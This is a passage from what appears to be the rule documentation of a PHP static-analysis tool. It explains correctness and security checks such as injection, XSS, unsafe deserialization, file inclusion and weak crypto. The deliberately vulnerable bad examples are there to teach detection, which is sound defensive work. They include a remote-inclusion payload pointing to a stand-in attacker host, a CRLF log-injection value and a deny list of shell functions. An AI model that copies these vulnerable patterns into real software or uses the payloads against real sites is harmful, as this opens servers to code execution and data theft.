what_it_checks: `str_repeat()` with a negative repeat count
`array_fill()` with a negative count
`range()` with a zero step
`str_split()` and `mb_str_split()` with a non-positive chunk length
`explode()` with an empty delimiter
`array_chunk()` with a non-positive chunk size
`array_combine()` with literal arrays of different lengths
`random_int()`, `mt_rand()`, and `rand()` with a minimum greater than the maximum

rules.title: E0050: Position check used as boolean
rules.plain_english: `strpos()`, `stripos()`, `strrpos()`, and `strripos()` return `0` when the match is at the very start of the string. In a boolean context, PHP treats `0` as false, so a condition like `if (strpos(...))` treats a match at position zero as "not found."
rules.why_matters: A valid match at the beginning of the string can silently take the wrong branch, causing incorrect behavior that is easy to miss in testing.
what_it_checks: `if`, `elseif`, `while`, `do`/`while`, and `for` conditions
Negated checks such as `!strpos($haystack, $needle)`
Checks combined with `&&`, `||`, `and`, `or`, or `xor`
Checks used as a ternary condition

rules.title: E0051: Count of a non-countable value
rules.plain_english: `count()` and `sizeof()` work on arrays and on objects that implement `Countable`. Passing a string, number, boolean, or `null` causes a `TypeError` in PHP 8.
rules.why_matters: The code fails at runtime instead of returning a length, which can break a request, job, or CLI command.
rules.bad_example:
count('hello'); // TypeError
sizeof(42);     // TypeError
count(null);    // TypeError
rules.good_example:
count($items);       // $items is an array
sizeof($collection); // $collection implements Countable
strlen($text);       // use strlen() for strings
what_it_checks: `count()` or `sizeof()` with a string literal
`count()` or `sizeof()` with an integer or float literal
`count()` or `sizeof()` with a boolean or `null` literal

rules.title: E0052: Unchecked json_decode result
rules.plain_english: `json_decode()` returns `null` when the JSON is invalid. If the result is immediately accessed as an object or array, PHP may produce a warning, exception, or "property on null" error.
rules.why_matters: Malformed input from a request body, file, or external API can cause a runtime failure instead of a clear validation or error-handling path.
rules.bad_example:
return json_decode($json)->name;
return json_decode($json, true)[0];
rules.good_example:
$data = json_decode($json, true, flags: JSON_THROW_ON_ERROR);

return $data['name'];
what_it_checks: `json_decode($json)->property`
`json_decode($json)->method()`
`json_decode($json)[$key]`

rules.title: E0053: Unserialize without allowed_classes
rules.plain_english: `unserialize()` can create objects of classes named inside the input. If untrusted input controls that data, it may trigger dangerous `__wakeup()` or `__destruct()` behavior in classes loaded by the application. This is commonly called object injection.
rules.why_matters: Object injection can lead to unexpected side effects, including file writes, command execution, or other security issues, depending on which classes are available.
what_it_checks: `unserialize($payload)` with no options argument
A literal options array without an `allowed_classes` key
`allowed_classes => true`, which explicitly allows every class
Named arguments such as `unserialize(data: $payload, options: [...])`

rules.title: E0054: Dynamic variable creation
rules.plain_english: `extract()` and variable variables such as `$$name` create local variable names from runtime data. This makes code harder to follow and can allow unexpected keys to overwrite local variables.
rules.why_matters: Unexpected variable creation can make function behavior difficult to understand and, when request data is involved, can overwrite security-sensitive local state.
what_it_checks: `extract($data)` calls
Indirect variables such as `${$name}`
Nested variables such as `$$name` and `$$$name`

rules.title: E0055: Dynamic include or require
rules.plain_english: `include`, `require`, `include_once`, and `require_once` load the file path they are given. When that path is built from runtime data, it can be difficult to know which files will be loaded and, if untrusted input is involved, may allow unexpected file inclusion.
rules.why_matters: Dynamic include paths can make code harder to audit, expose local files, or load attacker-controlled code depending on how the path is constructed.
rules.bad_example:
include $_GET['page'];
include $base . '/bootstrap.php';
what_it_checks: A path that is a variable, property access, array access, or function call
A concatenation where any part is dynamic
A conditional or other computed path expression

rules.title: E0056: Weak randomness for security-sensitive value
rules.plain_english: Functions such as `rand()`, `mt_rand()`, and `uniqid()` are predictable. They are not suitable for tokens, passwords, salts, nonces, or other secrets, even though they may be fine for games or non-security sampling.
rules.why_matters: Predictable values can be guessed or brute-forced, which may expose password-reset links, CSRF tokens, session identifiers, API keys, or other sensitive data.
what_it_checks: Weak generators: `rand()`, `mt_rand()`, `uniqid()`, `lcg_value()`, `str_shuffle()`, and `array_rand()`
Assignments to variables whose names look security-sensitive, such as `token`, `secret`, `password`, `nonce`, `salt`, `csrf`, or `api_key`
Values passed to `password_hash()`, `hash_hmac()`, `hash()`, `openssl_encrypt()`, `openssl_sign()`, cookie functions, or session ID functions

rules.title: E0057: MD5 or SHA1 used for a password
rules.plain_english: MD5 and SHA1 are fast hash functions. Password hashing should use a deliberately slow, salted algorithm so large-scale guessing attacks are more expensive.
rules.why_matters: If password hashes are exposed, fast unsalted hashes can be cracked much more easily than hashes produced by dedicated password hashing functions.
what_it_checks: `md5($password)` and `sha1($password)`
`hash('md5', $password)` and `hash('sha1', $password)`
Password-like variables or properties used as the hashed value

rules.title: E0058: Cookie missing Secure or HttpOnly
rules.plain_english: Cookies used for sessions or authentication should usually set `Secure` and `HttpOnly`. `Secure` limits cookies to HTTPS connections, and `HttpOnly` prevents JavaScript from reading the cookie.
rules.why_matters: Without `Secure`, a cookie may be sent over an insecure connection. Without `HttpOnly`, a cross-site scripting bug can expose the cookie to client-side scripts.
what_it_checks: `setcookie()` and `setrawcookie()` with missing or disabled `secure` and `httponly` options
`session_set_cookie_params()` with missing or disabled `secure` and `httponly` options
Array options, positional arguments, and named arguments
Array keys are matched case-insensitively, so both `httponly` and `httpOnly` are recognized

rules.title: E0059: Dynamic eval or assert
rules.plain_english: `eval()` executes a string as PHP code. A string-based `assert()` can also execute code. If any part of that code comes from untrusted input, it can lead to code execution.
rules.why_matters: Executing code built at runtime is difficult to validate safely and can turn data into executable behavior.
rules.bad_example:
return eval($code);

assert('$value > 0');
what_it_checks: Any `eval()` call
`assert()` with a string literal or string concatenation

rules.title: E0060: SQL injection
rules.plain_english: This rule reports SQL query calls where user-controlled input is included in the query string. An attacker may be able to change the meaning of the query by supplying crafted input.
rules.why_matters: SQL injection can expose, modify, or delete data, bypass authentication, or lead to broader system compromise depending on database permissions and application behavior.
rules.bad_example:
$id = $_GET['id'] ?? '';
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = $id");
what_it_checks: SQL execution calls such as `mysqli_query()`, `mysqli_real_query()`, `mysqli_multi_query()`, `mysql_query()`, `pg_query()`, `pg_exec()`, `pg_send_query()`, `sqlite_query()`, and `sqlite_exec()`
Method calls named `query`, `exec`, `real_query`, or `multi_query`
Cases where user-controlled input reaches the SQL argument, based on taint analysis and dynamic-expression heuristics

rules.title: E0061: Cross-Site Scripting (XSS)
rules.plain_english: This rule reports output of user-controlled data to HTML without appropriate escaping. If an attacker can inject markup or script content, it may execute in another user's browser.
rules.why_matters: XSS can expose session data, perform actions as the affected user, redirect users, or modify page content.
rules.bad_example: echo "Welcome, " . $_GET['name'];
rules.good_example: echo "Welcome, " . htmlspecialchars($_GET['name'] ?? '', ENT_QUOTES, 'UTF-8');
what_it_checks: `echo` statements and short echo tags
`print()`, `printf()`, and `vprintf()` calls
Cases where user-controlled input reaches HTML output, based on taint analysis and dynamic-expression heuristics

rules.title: E0062: Command injection
rules.plain_english: This rule reports shell command calls where user-controlled input reaches the command argument. An attacker may be able to inject additional shell syntax or commands.
rules.why_matters: Command injection can allow arbitrary command execution on the server, which may lead to data exposure, data loss, or full system compromise.
rules.bad_example:
$file = $_GET['file'] ?? '';
system("cat $file");
what_it_checks: Shell execution functions such as `system()`, `exec()`, `shell_exec()`, `passthru()`, `popen()`, and `proc_open()`
Cases where user-controlled input reaches the command argument, based on taint analysis and dynamic-expression heuristics

rules.title: E0063: LDAP injection
rules.plain_english: This rule reports LDAP search calls where user-controlled input reaches the LDAP filter or query argument. Crafted input can change the meaning of an LDAP filter.
rules.why_matters: LDAP injection can affect authentication and directory lookups, potentially allowing unauthorized access, disclosure of directory data, or unintended query results.
what_it_checks: `ldap_search()`, `ldap_list()`, and `ldap_read()` calls
Cases where user-controlled input reaches these calls, based on taint analysis and dynamic-expression heuristics

rules.title: E0064: XPath injection
rules.plain_english: This rule reports XML/XPath-related calls where user-controlled input reaches the sink. Crafted input can change how XML is loaded or queried, depending on the API and usage.
rules.why_matters: XPath or XML injection can expose unintended data, bypass checks, or cause the application to process attacker-controlled XML content.
what_it_checks: Method calls named `load` or `loadxml`
`simplexml_load_string()` calls
Cases where user-controlled input reaches these calls, based on taint analysis and dynamic-expression heuristics

rules.title: E0065: NoSQL injection
rules.plain_english: This rule reports NoSQL query calls where user-controlled input reaches the query argument. In NoSQL systems, attacker-controlled operators or structures can change query behavior.
rules.why_matters: NoSQL injection can bypass authentication, expose unintended records, or modify or delete data depending on the query and database permissions.
rules.bad_example:
$username = $_GET['user'] ?? '';
$collection->findOne(['username' => $username]);
rules.good_example:
$username = (string)($_GET['user'] ?? '');
$collection->findOne(['username' => $username]);
what_it_checks: MongoDB/PHPLIB-style method calls such as `insertOne`, `insertMany`, `updateOne`, `updateMany`, `replaceOne`, `deleteOne`, `deleteMany`, `findOne`, `find`, `aggregate`, `countDocuments`, `distinct`, and `createClient`
Functions such as `mongo_insert`, `mongo_update`, and `mongo_find`
Cases where user-controlled input reaches these calls, based on taint analysis and dynamic-expression heuristics

rules.title: E0066: Header injection
rules.plain_english: This rule reports HTTP header-related calls where user-controlled input reaches the header value. Crafted input containing CR/LF characters can be used to inject additional headers or manipulate the response.
rules.why_matters: Header injection can lead to response splitting, cache poisoning, unsafe redirects, session-related issues, or other header manipulation vulnerabilities depending on the context.
rules.bad_example:
$url = $_GET['url'] ?? '';
header("Location: $url");
what_it_checks: `header()`, `header_remove()`, `setcookie()`, and `setrawcookie()` calls
Cases where user-controlled input reaches these calls, based on taint analysis and dynamic-expression heuristics

rules.title: E0067: Mail injection
rules.plain_english: This rule reports mail-sending calls where user-controlled input reaches mail headers, subject, or related arguments. Crafted input can inject additional mail headers.
rules.why_matters: Mail injection can allow attackers to abuse a contact form or mail feature to send spam, spoof headers, or add unintended recipients.
rules.bad_example:
$email = $_GET['email'] ?? '';
mail('admin@example.com', 'Contact', $body, "From: $email");
what_it_checks: `mail()` and `mb_send_mail()` calls
Cases where user-controlled input reaches these calls, based on taint analysis and dynamic-expression heuristics

rules.title: E0068: Eval injection
rules.plain_english: This rule reports code-evaluation sinks where user-controlled input reaches `eval()` or a string-based `assert()` call. This can allow arbitrary PHP code execution.
rules.why_matters: If an attacker can control evaluated code, they may be able to execute commands, read or modify files, access data, or take control of the application environment.
rules.bad_example:
$code = $_GET['code'] ?? '';
eval($code);
what_it_checks: `eval()` calls with user-controlled input
`assert()` calls with user-controlled string input
Cases detected through taint analysis and dynamic-expression heuristics

rules.title: E0069: Unsafe deserialization
rules.plain_english: Passing untrusted data to `unserialize()` or similar deserialization functions can instantiate arbitrary PHP objects and trigger magic methods such as `__wakeup()` and `__destruct()`.
rules.why_matters: PHP object injection is a critical vulnerability. A crafted serialized payload can: - Trigger magic methods when unserialized - Execute code through gadget chains in loaded classes - Read, modify, or delete files - Lead to remote code execution
rules.bad_example:
$data = $_GET['data'] ?? '';
$result = unserialize($data);
what_it_checks: `unserialize()` calls with tainted input from `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, or `php://input`
`session_decode()` with user-controlled data

rules.title: E0070: Remote file inclusion
rules.plain_english: Using user-controlled input to determine which file to include or require can allow an attacker to load and execute remote or local files on the server.
rules.why_matters: Remote file inclusion (RFI) and local file inclusion (LFI) can allow attackers to: - Include and execute PHP code from remote servers - Read sensitive local files - Compromise the server
rules.bad_example:
$page = $_GET['page'] ?? '';
include $page; // ?page=http://evil.com/shell.txt
what_it_checks: `include`, `require`, `include_once`, and `require_once` where the path is built from user-controlled input
`file_get_contents()`, `readfile()`, and `fopen()` with user-controlled file paths from remote sources

rules.title: E0071: Unsafe file upload
rules.plain_english: Storing uploaded files without validating their type, extension, or destination can allow an attacker to upload executable code to the server.
rules.why_matters: An attacker who can upload a `.php` file and access it through the web server may be able to: - Execute arbitrary code - Gain control of the server - Use the uploaded file as a foothold for further attacks
rules.bad_example: move_uploaded_file($_FILES['file']['tmp_name'], '/uploads/' . $_FILES['file']['name']);
what_it_checks: `move_uploaded_file()` without prior extension or MIME validation
`file_put_contents()` with `$_FILES` data
`$_FILES['name']` used directly in file paths without sanitization

rules.title: E0072: Path traversal
rules.plain_english: Using user-controlled input to build a file path without sanitizing `../` sequences can allow an attacker to read or write files outside the intended directory.
rules.why_matters: Path traversal vulnerabilities can allow attackers to: - Read sensitive files such as `/etc/passwd`, source code, or credentials - Write arbitrary files to the server - Achieve remote code execution when combined with other vulnerabilities, such as file upload
rules.bad_example:
$page = $_GET['page'] ?? '';
include __DIR__ . '/pages/' . $page . '.php';
what_it_checks: `include`, `require`, `file_get_contents()`, `file_put_contents()`, and `fopen()` with paths built from tainted input
`../` or null byte (`%00`) sequences in user-controlled paths

rules.title: E0073: Weak cryptographic hash
rules.plain_english: Hashing passwords with weak, fast algorithms such as MD5 or SHA1 is unsafe. Use a dedicated password hashing function such as `password_hash()`.
rules.why_matters: MD5 and SHA1 are designed for speed, not password storage. Attackers can: - Crack password hashes quickly using rainbow tables or GPU brute force - Recover common passwords in a short time - Compromise many user accounts if hashes are exposed
rules.bad_example:
$hash = md5($password);   // weak and fast
$hash = sha1($password);  // weak and fast
what_it_checks: `md5()`, `sha1()`, `hash('md5', ...)`, and `hash('sha1', ...)` applied to password-like variables
`crypt()` without a proper salt or cost parameter

rules.title: E0074: Weak random number generator
rules.plain_english: Generating security-sensitive values (such as tokens, keys, salts, or CSRF tokens) with `rand()` or `mt_rand()` is unsafe because these functions are not cryptographically secure.
rules.why_matters: `rand()` and `mt_rand()` use weak pseudorandom number generators. Attackers may be able to: - Predict future random values from prior outputs - Guess session tokens, CSRF tokens, or password reset tokens - Bypass authentication or authorization
rules.bad_example:
$token = bin2hex(mt_rand(100000, 999999)); // predictable
$key = rand(1000, 9999);                    // easily brute-forced
rules.good_example:
$token = bin2hex(random_bytes(16));  // cryptographically secure
$key = random_int(1000, 9999);       // cryptographically secure
what_it_checks: `rand()`, `mt_rand()`, and `uniqid()` used for security-sensitive purposes (tokens, keys, salts)
`mt_rand()` without seeding from a secure source

rules.title: E0075: Session security
rules.plain_english: Calling `session_start()` without secure cookie settings can leave session IDs vulnerable to interception and theft.
rules.why_matters: Insecure session configuration can allow attackers to: - Steal session cookies over unencrypted HTTP - Access session data via JavaScript in an XSS attack - Fixate session IDs before authentication - Hijack authenticated user sessions
what_it_checks: `session_start()` without prior `session_set_cookie_params()` setting `secure => true` and `httponly => true`
`ini_set('session.cookie_secure', '0')` or `ini_set('session.cookie_httponly', '0')`
`session.use_trans_sid = 1` (session ID in URL)

rules.title: E0076: Information disclosure
rules.plain_english: Leaving `phpinfo()` in committed production code exposes detailed PHP configuration, version, extensions, and environment variables to anyone who can access that page.
rules.why_matters: Attackers can use `phpinfo()` output to: - Fingerprint the server (PHP version, loaded extensions) - Identify version-specific vulnerabilities - Read environment variables and configuration values - Plan targeted attacks against the infrastructure
rules.bad_example: <?php phpinfo(); ?>
rules.good_example:
// Remove phpinfo() entirely from production code.
// Use it only in local development and do not commit it.
what_it_checks: `phpinfo()` function calls anywhere in committed source code
`phpinfo(INFO_ALL)`, `phpinfo(INFO_GENERAL)`, and other `phpinfo()` variants

rules.title: E0077: Display errors enabled
rules.plain_english: Enabling `display_errors` via `ini_set()` or similar causes PHP errors to be rendered in the browser, which can expose stack traces, file paths, and variable values.
rules.why_matters: Error messages shown to users can expose: - File paths and directory structure - Database structure and SQL queries - Sensitive variable contents - Information that helps attackers understand the application
rules.bad_example:
ini_set('display_errors', '1');
ini_set('error_reporting', 'E_ALL');
what_it_checks: `ini_set('display_errors', '1')` or `ini_set('display_errors', 'true')`
`error_reporting(E_ALL)` without `display_errors = Off`
`.htaccess` or `.user.ini` directives enabling `display_errors`

rules.title: E0078: Variable variables
rules.plain_english: Using `extract()` on user-controlled arrays or using variable variables (`$$x`) with tainted names can allow an attacker to overwrite internal variables.
rules.why_matters: Variable variables and `extract()` can: - Overwrite internal variables such as `$is_admin`, `$auth`, or `$user` - Bypass access controls by injecting unexpected variables - Lead to remote code execution when combined with dynamic function calls
what_it_checks: `extract()` with `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, or other tainted arrays
`$$var` variable variables where `$var` originates from user input

rules.title: E0079: Dynamic method call
rules.plain_english: Invoking a method using a method name that comes from user input can allow an attacker to call unintended methods on your objects.
rules.why_matters: Dynamic method invocation can: - Reach unintended business logic or internal methods - Bypass access controls on sensitive operations - Execute dangerous methods with attacker-controlled arguments
rules.bad_example:
$method = $_GET['method'] ?? '';
$obj->$method();
what_it_checks: `$obj->$method()` where `$method` is a variable from user input
`$obj->{$method}()` with a tainted method name
`call_user_func([$obj, $method])` with a tainted method name

rules.title: E0080: Weak cryptographic function
rules.plain_english: Using `crypt()` for password hashing, or using it with weak parameters, is unsafe. Use a modern password hashing function such as `password_hash()`.
rules.why_matters: `crypt()` with weak parameters (such as DES-based crypt) is vulnerable to: - Fast brute-force attacks due to limited key space - Rainbow table attacks when no salt or a weak salt is used - Outdated behavior compared to bcrypt or Argon2 used by `password_hash()`
rules.bad_example:
$hash = crypt($password, '$1$saltsalt$'); // MD5-based crypt, weak
$hash = crypt($password);                   // uses system default, may be weak
what_it_checks: `crypt()` calls used for password hashing
`crypt()` without a proper salt parameter

rules.title: E0081: Deprecated regex function
rules.plain_english: POSIX regex functions such as `ereg()` and `split()` are deprecated and were removed in PHP 7.0. Use the `preg_*()` family or `explode()` instead.
rules.why_matters: Using removed functions causes fatal errors on PHP 7.0 and later, which breaks the application. The `preg_*()` functions are more capable and actively maintained.
what_it_checks: `ereg()`, `ereg_replace()`, `eregi()`, and `eregi_replace()` calls
`split()` and `spliti()` calls

rules.title: E0082: Dynamic extension loading
rules.plain_english: Using `dl()` to load PHP extensions at runtime is risky and unsupported in most modern PHP configurations.
rules.why_matters: Dynamic extension loading can: - Load malicious or unverified extensions - Bypass security controls provided by the base PHP installation - Cause instability or crashes if extensions are incompatible - Fail on modern PHP versions, as `dl()` is disabled in many configurations and removed in PHP 7.0+
rules.bad_example:
dl('my_extension.so'); // loads extension at runtime
dl('php_mysql.dll');
what_it_checks: `dl()` function calls anywhere in the code

rules.title: E0083: Open redirect
rules.plain_english: Redirecting users to a URL supplied in the request without validating where it goes can allow attackers to craft phishing links that appear to come from your domain.
rules.why_matters: Open redirect vulnerabilities are commonly used in: - **Phishing campaigns**: users trust your domain and click the link - **Bypassing SSO protections**: redirecting after login to a malicious site - **Credential harvesting**: the malicious site mimics a trusted page
what_it_checks: `header("Location: ...")` with tainted input
`header("refresh: ...;url=...")` with tainted input

rules.title: E0084: SQL query string concatenation
rules.plain_english: Concatenating user input directly into SQL query strings can allow attackers to inject arbitrary SQL and read, modify, or delete database data.
rules.why_matters: SQL injection is a serious vulnerability. It can lead to: - Theft of user data (such as emails, passwords, or payment information) - Authentication bypass - Database modification or deletion - Broader server compromise in some environments
rules.bad_example:
$id = $_GET['id'] ?? '';
$result = mysqli_query($conn, "SELECT * FROM users WHERE id = $id");
what_it_checks: `mysqli_query()`, `mysqli::query()`, `pg_query()`, `pg_exec()`, `PDO::query()`, and `PDO::exec()` calls
Cases where user input (`$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, etc.) is concatenated directly into the SQL string

rules.title: E0085: Inline PHP execution short tags
rules.plain_english: Short echo tags (`<?= ?>`) and short open tags (`<?`) can cause portability issues. In environments where `short_open_tag` is disabled, code may break or be served as plain text.
rules.why_matters: Short tags can cause: - PHP source code to be served as plain text if `short_open_tag` is disabled - Portability issues across different server configurations - Confusion with XML declarations (`<?xml ... ?>`)
rules.bad_example:
<?= $userInput ?>
<?= $variable ?>
rules.good_example:
<?php echo $userInput; ?>
<?php echo htmlspecialchars($variable, ENT_QUOTES, 'UTF-8'); ?>
what_it_checks: `<?= ... ?>` short echo tags in PHP files
`<?` short open tags (without `php`)

rules.title: E0086: Deprecated session function
rules.plain_english: Deprecated session functions `session_register()`, `session_is_registered()`, and `session_unregister()` were removed in PHP 5.4. Use the `$_SESSION` superglobal instead.
rules.why_matters: These functions no longer exist in PHP 5.4 and later, so code that uses them will cause fatal errors. `$_SESSION` is the supported way to manage session data.
what_it_checks: `session_register()`, `session_is_registered()`, and `session_unregister()` function calls

rules.title: E0087: Command execution with backticks
rules.plain_english: Passing user input to the backtick (shell execution) operator can allow an attacker to run arbitrary shell commands on the server.
rules.why_matters: Command injection can lead to: - Reading sensitive files (such as `/etc/passwd`, source code, or credentials) - Modifying or deleting data - Installing malware or backdoors - Full server compromise
rules.bad_example:
$ip = $_GET['ip'] ?? '';
$output = `ping -c 4 $ip`;
what_it_checks: Backtick operator (`` `$cmd` ``) with tainted input
`shell_exec()`, `exec()`, `system()`, and `passthru()` with tainted input (also covered by E0127-E0131)

rules.title: E0088: Reflection-based injection
rules.plain_english: Invoking the PHP Reflection API with user-controlled input can allow an attacker to instantiate classes, call methods, or access properties that should not be reachable.
rules.why_matters: Reflection-based injection can: - Instantiate any autoloadable class - Call private or protected methods - Access sensitive object properties - Lead to object injection and remote code execution through gadget chains
what_it_checks: `ReflectionClass`, `ReflectionMethod`, and `ReflectionProperty` constructed from tainted input
`ReflectionMethod::invoke()` and `ReflectionMethod::invokeArgs()` with tainted method names

rules.title: E0089: Log injection
rules.plain_english: Writing user input to log files without sanitizing newline characters (CRLF) can allow an attacker to inject fake log entries or corrupt log data.
rules.why_matters: Log injection can be used to: - Hide attacks by injecting fake log entries - Forge audit trails for social engineering - Corrupt log files, making incident response harder
rules.bad_example:
error_log("User {$_GET['username']} logged in");
// ?username=admin%0d%0aInjection: fake entry
rules.good_example:
$username = str_replace(["\r", "\n"], '', $_GET['username'] ?? '');
error_log("User $username logged in");
what_it_checks: `error_log()`, `syslog()`, and `trigger_error()` with tainted superglobals directly interpolated
Custom log writers (`file_put_contents($log, $user_input)`) with user input

rules.title: E0090: File write to user-controlled path
rules.plain_english: Using user input to determine a file path for writing can allow an attacker to write files to arbitrary locations on the server.
rules.why_matters: Arbitrary file writes can: - Overwrite critical system or application files - Drop a web shell for remote code execution - Modify configuration files to weaken security
what_it_checks: `file_put_contents()`, `file()`, and `fopen()` with `'w'`, `'w+'`, `'a'`, or `'a+'` modes where the path is built from user-controlled input
`file_get_contents()` used with write contexts (stream contexts)

rules.title: E0091: Source code exposure via highlight_file
rules.plain_english: Using `highlight_file()`, `show_source()`, or `highlight_string()` in production code can expose PHP source code, including credentials and application logic, to anyone who can access that page.
rules.why_matters: Source code disclosure can expose: - Database credentials and API keys - Business logic and application flow - Other vulnerabilities in the codebase - Third-party library versions
rules.good_example:
// Remove source-highlighting functions from production code.
// If debugging is needed, use a local development environment.
what_it_checks: `highlight_file()`, `show_source()`, and `highlight_string()` calls
Especially risky when gated by user input (`$_GET['debug']`)

rules.title: E0092: XML External Entity (XXE)
rules.plain_english: Parsing XML from untrusted input without disabling external entity resolution can allow an attacker to read local files or make outbound requests from your server.
rules.why_matters: - Local file disclosure (for example `/etc/passwd`, source code, or credentials) - Server-Side Request Forgery (SSRF) against internal services - Port scanning of internal networks - Denial of service
what_it_checks: `simplexml_load_string()`, `DOMDocument::loadXML()`, and `DOMDocument::load()` with tainted input and `LIBXML_NOENT`, or without `LIBXML_NONET`
`xml_parser_create()` / `xml_parse()` with default entity handling

rules.title: E0093: Template Injection
rules.plain_english: Rendering user-controlled input directly as a template source (Twig, Smarty, Blade, etc.) without validation can allow an attacker to inject template expressions that execute code on the server.
rules.why_matters: Server-side template injection (SSTI) can lead to: - Remote code execution - Reading sensitive files (for example `/etc/passwd`) - Full server compromise
rules.bad_example:
$template = $_GET['template'] ?? '';
echo $twig->render($template, ['name' => $user->name]);
what_it_checks: `Twig::render()`, `$twig->render()`, `$smarty->display()`, `$blade->render()`, and similar calls with tainted template names or sources
Template engines rendering user-controlled strings as template source

rules.title: E0094: Denial of Service via Regular Expression
rules.plain_english: User-supplied regular expressions, or regex patterns applied to user input, can cause catastrophic backtracking (ReDoS), consuming CPU and making the application unavailable.
rules.why_matters: ReDoS can cause CPU spikes and denial of service. A single malicious request may keep a worker busy for seconds or minutes, exhausting application capacity.
what_it_checks: Nested quantifiers in regex patterns, such as `(a+)+`, `(a*)*`, `(a|b)+`
User-supplied regex patterns passed to `preg_match()`, `preg_replace()`, or `preg_split()`
`preg_match()` on very long user input without timeout

rules.title: E0095: Insecure Comparison
rules.plain_english: Comparing secrets (passwords, tokens, API keys, signatures) using `==` or `===` instead of `hash_equals()` can create a timing side-channel that attackers can exploit.
rules.why_matters: PHP's `==` operator returns early on the first mismatched byte. Attackers can measure response times to: - Guess secrets one character at a time - Bypass authentication by guessing API tokens - Recover signing keys or other secrets
what_it_checks: `==` or `===` comparisons where one operand is a secret-like variable (`token`, `secret`, `key`, `password`, `hash`, `signature`, `mac`, `hmac`)
Both operands must be strings for the timing issue to apply

rules.title: E0096: Cookie Without Secure Flag
rules.plain_english: Setting a cookie without the `Secure` flag allows it to be sent over unencrypted HTTP, where it can be intercepted by network attackers.
rules.why_matters: Without the `Secure` flag: - Session cookies can be stolen via network sniffing - Attackers on the same network can capture cookies - Authentication tokens are exposed in transit
what_it_checks: `setcookie()` or `setrawcookie()` calls where `secure` is not set to `true`
`session_set_cookie_params()` with `secure => false`

rules.title: E0097: Cookie Without HttpOnly Flag
rules.plain_english: Setting a cookie without the `HttpOnly` flag allows it to be accessed by JavaScript, which increases the impact of XSS vulnerabilities.
rules.why_matters: Without the `HttpOnly` flag: - Session cookies can be stolen by malicious JavaScript - XSS attacks can exfiltrate authentication tokens - Attackers can hijack user sessions
what_it_checks: `setcookie()` or `setrawcookie()` calls where `httponly` is not set to `true`
`session_set_cookie_params()` with `httponly => false`

rules.title: E0098: Session ID in URL
rules.plain_english: Embedding session IDs in URLs via `session.use_trans_sid` exposes them in Referer headers, browser history, and server logs.
rules.why_matters: Session IDs in URLs can: - Be leaked via Referer headers when users click external links - Be stored in browser history - Be logged by web servers and proxies - Be used for session hijacking
what_it_checks: `session.use_trans_sid = 1` or `ini_set('session.use_trans_sid', '1')`
Links containing `PHPSESSID` or similar session ID parameters

rules.title: E0099: Disable Functions Bypass
rules.plain_english: If `disable_functions` is not configured in `php.ini`, dangerous PHP functions remain available after code execution is achieved.
rules.why_matters: `disable_functions` reduces the attack surface. Even if an attacker injects code, disabling dangerous functions can make it harder to run shell commands or perform other high-risk operations.
rules.bad_example:
// php.ini: disable_functions not set (empty)
// All functions remain available
rules.good_example: // php.ini: disable_functions = exec,system,passthru,shell_exec,popen,proc_open,eval,create_function
what_it_checks: This rule is primarily informational/documentation
`php.ini` cannot be read directly by the rule
`ini_set('disable_functions', ...)` is `PHP_INI_SYSTEM` and cannot be changed at runtime

rules.title: E0100: Variable Function Call
rules.plain_english: Calling a function using a name that comes from user input can allow an attacker to invoke arbitrary PHP functions on your server.
rules.why_matters: Variable function calls allow dynamic code execution when the function name is controllable by an attacker: - Arbitrary PHP functions can be called - Dangerous system functions like `system()`, `exec()`, or `shell_exec()` may be reachable - Access controls may be bypassed
what_it_checks: `$func()` where `$func` is assigned from tainted superglobals
`call_user_func($func, ...)` where `$func` is tainted
`call_user_func_array($func, ...)` where `$func` is tainted

rules.title: E0101: Object Injection via unserialize
rules.plain_english: Passing untrusted data to `unserialize()` can instantiate arbitrary PHP objects and trigger magic methods, leading to object injection and potentially remote code execution.
rules.why_matters: PHP object injection is a critical vulnerability. Attackers can craft serialized objects that: - Trigger `__wakeup()`, `__destruct()`, or other magic methods - Execute arbitrary code through gadget chains - Read, modify, or delete files - Achieve full server compromise
rules.bad_example:
$data = $_GET['data'] ?? '';
$result = unserialize($data);
what_it_checks: `unserialize()` calls where the argument may originate from `$_GET`, `$_POST`, `$_REQUEST`, `$_COOKIE`, or `php://input`
`session_decode()` with user-controlled data

rules.title: E0102: Command Injection via proc_open
rules.plain_english: Passing user input to `proc_open()` as part of a command can allow an attacker to execute arbitrary shell commands on your server.
rules.why_matters: Command injection via `proc_open()` can: - Run arbitrary system commands - Read or modify files and databases - Install malware or backdoors - Achieve full server compromise
what_it_checks: `proc_open()` calls where the command string contains tainted input
`proc_open()` with user-controlled command arguments without `escapeshellarg()`

rules.title: E0103: Server-Side Request Forgery (SSRF)
rules.plain_english: Making network requests to URLs supplied by the user can allow an attacker to probe internal services or exfiltrate data from your internal network.
